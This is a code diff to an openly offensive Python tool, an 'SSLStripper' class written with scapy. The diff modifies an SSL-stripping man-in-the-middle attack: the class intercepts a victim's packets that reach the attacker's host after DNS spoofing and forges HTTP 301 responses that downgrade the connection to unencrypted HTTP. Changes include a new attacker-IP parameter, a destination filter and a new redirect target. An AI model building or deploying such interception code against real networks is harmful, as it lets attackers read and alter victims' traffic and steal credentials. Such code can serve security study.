@@ -4,9 +4,10 @@ from logger import log_info, log_warning
 from scapy.layers.http import HTTPRequest, TCP, Raw
 
 class SSLStripper:
-    def __init__(self, interface, ip_victim, ip_to_spoof):
+    def __init__(self, interface, ip_victim, ip_attacker, ip_to_spoof):
         self.interface = interface
         self.ip_victim = ip_victim
+        self.ip_attacker = ip_attacker
         self.ip_to_spoof = ip_to_spoof
 
     def strip(self):
@@ -24,6 +25,8 @@ class SSLStripper:
         if (
             # Ideally we would want to check that this is an HTTPS packet, but it is encrypted
             packet[IP].src == self.ip_victim
+            # Because we did the DNS spoofing, we should only strip if the destination IP is us (as in only then it is intended for the server)
+            and packet[IP].dst == self.ip_attacker
         ):
             log_info(
                 "Received HTTPS request for {} from {}".format(
@@ -34,10 +37,10 @@ class SSLStripper:
             response = (
                 IP(dst=packet[IP].src, src=packet[IP].dst)
                 / TCP(dport=packet[TCP].sport, sport=packet[TCP].dport, flags="PA")
-                / Raw(load="HTTP/1.1 301 Moved Permanently\nLocation: http://{}".format(self.ip_to_spoof))
+                / Raw(load="HTTP/1.1 301 Moved Permanently\nLocation: http://{}".format(packet[IP].dst))
             )
 
             send(response, verbose=0)
-            log_info("Sent HTTP response for {} to {}".format(packet[IP].src, self.ip_to_spoof))
+            log_info("Sent HTTP response for {} to {}".format(packet[IP].src, packet[IP].dst))
         else:
             log_info("Ignoring packet from {}".format(packet[IP].src))
